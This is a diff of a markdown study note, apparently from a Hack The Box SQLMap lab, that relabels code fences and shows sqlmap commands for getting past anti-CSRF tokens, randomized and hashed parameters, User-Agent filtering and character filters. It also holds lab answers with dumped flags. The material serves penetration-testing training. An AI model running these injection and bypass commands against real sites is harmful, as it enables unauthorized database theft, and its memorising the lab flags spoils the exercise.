@@ -2,21 +2,21 @@
 ## Anti-CSRF Token Bypass
 By specifying the token parameter name, SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 ```
 
 ## Unique Value Bypass
 The option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent:
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
 ```
 
 ## Calculated Parameter Bypass
 Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
 ```
 
@@ -44,7 +44,7 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
 ## Questions
 1. What's the contents of table flag8? (Case #8) **Answer: HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}**
    - Found the csrf-token parameter name, run sqlmap with Anti-CSRF Token bypass:
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.69:32239/case8.php' --data "id=1*&t0ken=cS408HB1bUmxDsd6v37bbXeAAVlsfD0gd3LN58rq2E" --csrf-token "t0ken" --batch --level 5 --risk 3 -T flag8 --dump
         <SNIP>
         Database: testdb
@@ -59,7 +59,7 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
         ```
 2. What's the contents of table flag9? (Case #9) **Answer:**
    - Run sqlmap with randomize parameter value:
-        ```sh
+        ```shellsession
         $ sqlmap -u "http://154.57.164.69:32239/case9.php?id=1*&uid=607775628" --batch --level 5 --risk 3 --threads 10 --randomize=uid -T flag9 --dump
         <SNIP>
         Database: testdb
@@ -74,11 +74,11 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
         ```
 3. What's the contents of table flag10? (Case #10) **Answer:**
    - Specify `--proxy` option to see how the server process sqlmap's requests → notice that because of sqlmap's `User-Agent` the server is only responding with empty 200 OK responses:
-        ```sh
+        ```shellsession
         $ sqlmap -u "http://154.57.164.69:32239/case10.php" --data "id=1*" --batch --level 5 --risk 3 --threads 10 -T flag10 --dump --proxy="http://127.0.0.1:8080"
         ```
    - Bypass this with `--random-agent`:
-        ```sh
+        ```shellsession
         $ sqlmap -u "http://154.57.164.69:32239/case10.php" --data "id=1*" --batch --level 5 --risk 3 --threads 10 -T flag10 --dump --random-agent
         <SNIP>
         Database: testdb
@@ -93,7 +93,7 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
         ```
 4. What's the contents of table flag11? (Case #11) **Answer: HTB{5p3c14l_ch4r5_n0_m0r3}**
    - Run sqlmap with `between` tamper script to bypass the `<`, `>` filter:
-        ```sh
+        ```shellsession
         $ sqlmap -u "http://154.57.164.78:30146/case11.php?id=1*" --batch --level 5 --risk 3 --threads 10 -T flag11 --dump --tamper=between
         <SNIP>
         Database: testdb
